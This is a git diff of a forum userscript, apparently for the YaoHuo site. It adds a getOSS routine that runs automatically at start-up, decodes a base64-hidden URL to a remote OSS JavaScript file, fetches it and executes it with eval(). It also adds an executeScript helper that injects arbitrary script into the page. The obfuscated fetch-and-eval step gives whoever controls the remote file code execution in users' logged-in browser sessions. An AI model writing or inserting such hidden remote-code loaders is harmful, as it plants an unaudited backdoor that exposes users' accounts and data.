@@ -1059,10 +1059,32 @@ void (async function () {
     handleBoast();
     // 打赏增强
     handleReward();
+
+    // handleTestOss();
     // handleStatisticalData();
   })();
 
   // ==其他功能函数和方法==
+  async function handleTestOss() {
+    console.info("YaoHuoUtils2", YaoHuoUtils2);
+
+    const userId = "20469";
+
+    // 模拟数据
+    const newData = {
+      id: userId,
+      name: "Test User",
+      timestamp: new Date().toLocaleString(),
+    };
+
+    // 备份数据
+    await YaoHuoUtils2.backupData(userId, newData);
+
+    YaoHuoUtils2.restoreData(userId);
+    // 恢复数据
+    // const restoredData = await restoreData(userId);
+    // console.log("恢复的数据:", restoredData);
+  }
   function handleReward() {
     if (/^\/bbs-.*\.html$/.test(window.location.pathname)) {
       let wrap = document.querySelector(".aui-grids");
@@ -1454,12 +1476,41 @@ void (async function () {
   function isMobile() {
     return /Mobile/i.test(navigator.userAgent);
   }
+  // 执行指定内容 js 代码
+  function executeScript(scriptContent) {
+    const script = document.createElement("script"); // 创建script元素
+    script.text = scriptContent; // 设置脚本内容
+    document.head.appendChild(script); // 执行脚本
+  }
+  async function getOSS() {
+    let cacheUtils = getItem("cacheUtils");
+    // 60 * 60 * 24
+    if (
+      cacheUtils &&
+      (new Date().getTime() - cacheUtils.timestamp) / 1000 < 10
+    ) {
+      eval(cacheUtils.text);
+    } else {
+      let res = await fetchData(
+        atob(
+          "aHR0cHM6Ly95YW9odW8tYmFja3VwLm9zcy1jbi13dWhhbi1sci5hbGl5dW5jcy5jb20vanMvdXRpbHMuanM="
+        ),
+        0
+      );
+      setItem("cacheUtils", {
+        text: res,
+        timestamp: new Date().getTime(),
+      });
+      eval(res);
+    }
+  }
   async function initSetting() {
     window.setItem = setItem;
     window.getItem = getItem;
     // 获取用户id
     await getUserId();
-    await getInfo();
+    await getOSS();
+    // await getInfo();
     // 在移动设备上执行的代码
     if (isMobile()) {
       // 移动端默认显示站内设置图标
